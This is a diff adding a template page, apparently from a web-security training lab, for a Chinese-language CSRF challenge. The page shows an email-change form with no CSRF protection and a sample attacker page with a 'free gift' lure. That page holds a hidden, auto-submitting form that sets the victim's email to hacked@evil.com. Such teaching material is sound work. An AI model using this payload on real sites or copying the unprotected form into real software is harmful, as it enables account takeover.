@@ -1,0 +1,51 @@
+<%- include('../layout', { body: `
+<div class="challenge">
+  <div class="challenge-description">
+    <h3>CSRF - Level 1</h3>
+    <p>这个页面存在CSRF漏洞。尝试创建一个恶意页面，在用户不知情的情况下修改其邮箱地址。</p>
+    <p>提示：创建一个HTML文件，包含自动提交的表单，指向 <code>/csrf/level1/change-email</code> 接口。</p>
+  </div>
+  
+  <div class="challenge-info">
+    <h4>当前用户信息</h4>
+    <p><strong>用户名：</strong> ${user.username}</p>
+    <p><strong>邮箱：</strong> ${user.email}</p>
+  </div>
+  
+  <div class="challenge-form">
+    <h4>修改邮箱</h4>
+    <form method="POST" action="/csrf/level1/change-email">
+      <div class="form-group">
+        <label for="email">新邮箱地址：</label>
+        <input type="email" id="email" name="email" value="${user.email}" required>
+      </div>
+      <button type="submit" class="btn">更新邮箱</button>
+      <a href="/source/csrf/1" class="btn">查看源码</a>
+    </form>
+  </div>
+  
+  <div class="challenge-hint">
+    <h4>CSRF攻击示例</h4>
+    <p>以下是一个恶意页面的示例代码：</p>
+    <pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+  &lt;title&gt;赢取免费礼品！&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;h1&gt;恭喜！您已获得免费礼品！&lt;/h1&gt;
+  
+  &lt;!-- 隐藏的表单，自动提交 --&gt;
+  &lt;form id="csrf-form" action="http://localhost:5000/csrf/level1/change-email" method="POST" style="display:none"&gt;
+    &lt;input type="email" name="email" value="hacked@evil.com"&gt;
+  &lt;/form&gt;
+  
+  &lt;script&gt;
+    // 页面加载后自动提交表单
+    document.getElementById('csrf-form').submit();
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+  </div>
+</div>
+` }) %> 
